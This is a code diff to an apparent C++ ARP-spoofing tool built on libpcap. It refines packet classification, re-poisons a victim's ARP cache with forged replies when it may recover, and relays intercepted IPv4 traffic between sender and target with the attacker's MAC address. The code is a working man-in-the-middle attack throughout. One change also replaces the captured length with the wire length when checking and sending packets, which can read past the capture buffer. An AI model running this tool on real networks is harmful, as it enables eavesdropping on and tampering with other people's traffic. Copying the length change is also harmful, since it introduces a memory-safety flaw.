@@ -126,7 +126,7 @@ static int parse_packet(struct pcap_pkthdr *header, const u_char *packet, struct
     ArpHdr *arp_hdr;
     IpHdr *ip_hdr;
 
-    if (header->caplen < sizeof(EthHdr))
+    if (header->len < sizeof(EthHdr))
         return 0;
 
     eth_hdr = (EthHdr *)packet;
@@ -137,16 +137,22 @@ static int parse_packet(struct pcap_pkthdr *header, const u_char *packet, struct
         arp_hdr = (ArpHdr *)((char *)eth_hdr + sizeof(EthHdr));
 
         /* Sender -> All (ARP_REQ) => case 1 */
-        if (arp_hdr->sip() == info->sender_ip && arp_hdr->tip() == info->target_ip && arp_hdr->op() == ArpHdr::Request)
+        if (arp_hdr->sip() == info->sender_ip && arp_hdr->tip() == info->target_ip && arp_hdr->op() == ArpHdr::Request) {
+            pr_debug("receive packet (case 1)\n");
             return 1;
+        }
 
         /* Target -> Sender (ARP_REP) => case 2 */
-        if (arp_hdr->sip() == info->target_ip && arp_hdr->tip() == info->sender_ip && arp_hdr->op() == ArpHdr::Reply)
-            return 2;
+        if (arp_hdr->sip() == info->target_ip && arp_hdr->tip() == info->sender_ip && arp_hdr->op() == ArpHdr::Reply) {
+            pr_debug("receive packet (case 2)\n");
+            return 1;
+        }
 
         /* Target -> Sender (ARP_REQ) => case 3 */
-        if (arp_hdr->sip() == info->target_ip && arp_hdr->tip() == info->sender_ip && arp_hdr->op() == ArpHdr::Request)
+        if (arp_hdr->sip() == info->target_ip && arp_hdr->tip() == info->sender_ip && arp_hdr->op() == ArpHdr::Request) {
+            pr_debug("receive packet (case 3)\n");
             return 3;
+        }
     }
     else if (eth_hdr->type() == EthHdr::Ip4) {
         ip_hdr = (IpHdr *)((char *)eth_hdr + sizeof(EthHdr));
@@ -154,6 +160,7 @@ static int parse_packet(struct pcap_pkthdr *header, const u_char *packet, struct
         if (eth_hdr->smac() != info->sender_mac || ip_hdr->sip() != info->sender_ip) 
             return 0;
 
+        pr_debug("receive packet (case 4)\n");
         return 4;
     }
     /* TODO: parse ipv6 packet */
@@ -169,14 +176,14 @@ int relay_packet(struct attack_ctx *ctx, struct info *info, const u_char *packet
 
     eth_hdr = (EthHdr *)packet;
     ip_hdr = (IpHdr *)((char *)eth_hdr + sizeof(EthHdr));
+    if (ip_hdr->dip() != info->target_ip)
+        return 0;
 
     eth_hdr->smac_ = ctx->my_mac;
     eth_hdr->dmac_ = info->target_mac;
-    ip_hdr->ip_src = ctx->my_ip;
-    ip_hdr->ip_dst = info->target_ip;
 
-    ret = pcap_sendpacket(ctx->handle, reinterpret_cast<const u_char*>(&packet), packet_len);
-    if (ret < 0) {
+    ret = pcap_sendpacket(ctx->handle, packet, packet_len);
+    if (ret != 0) {
         pr_err("pcap_sendpacket return %d error=%s\n", ret, pcap_geterr(ctx->handle));
         return ret;
     }
@@ -192,17 +199,13 @@ static void print_packet(const u_char *packet)
     eth_hdr = (EthHdr *)packet;
     ip_hdr = (IpHdr *)((char *)eth_hdr + sizeof(EthHdr));
 
-    pr_info("============= <ETHERNET HEADER> =============\n"
-           "src mac: %s\n"
-           "dst mac: %s\n\n", 
-           std::string(eth_hdr->smac()).c_str(),
-           std::string(eth_hdr->dmac()).c_str());
+    pr_info("============= <ETHERNET HEADER> =============\n");
+    pr_info("src mac: %s\n", std::string(eth_hdr->smac()).c_str());
+    pr_info("dst mac: %s\n\n", std::string(eth_hdr->dmac()).c_str());
     
-    pr_info("=============   <IPV4 HEADER>   =============\n"
-           "src ip: %s\n"
-           "dst ip: %s\n\n",
-           std::string(ip_hdr->sip()).c_str(),
-           std::string(ip_hdr->dip()).c_str());
+    pr_info("=============   <IPV4 HEADER>   =============\n");
+    pr_info("src ip: %s\n", std::string(ip_hdr->sip()).c_str());
+    pr_info("dst ip: %s\n\n", std::string(ip_hdr->dip()).c_str());
 }
 
 static int handle_packet(struct attack_ctx *ctx)
@@ -231,7 +234,7 @@ static int handle_packet(struct attack_ctx *ctx)
             case 1:
             case 2:
             case 3:
-                pr_debug("sender %d may be recovered\n");
+                pr_debug("sender %d may be recovered\n", i);
                 ret = send_arp_packet(ctx, infoes[i].sender_mac, ctx->my_mac, infoes[i].sender_mac, 
                                 infoes[i].target_ip, infoes[i].sender_ip, ArpHdr::Reply);
                 if (ret < 0){
@@ -241,7 +244,7 @@ static int handle_packet(struct attack_ctx *ctx)
                 break;
             case 4:
                 print_packet(packet);
-                ret = relay_packet(ctx, &ctx->infoes[i], packet, header->caplen);
+                ret = relay_packet(ctx, &ctx->infoes[i], packet, header->len);
                 if (ret < 0){
                     pr_err("Cannot relay packet\n");
                     return -1;
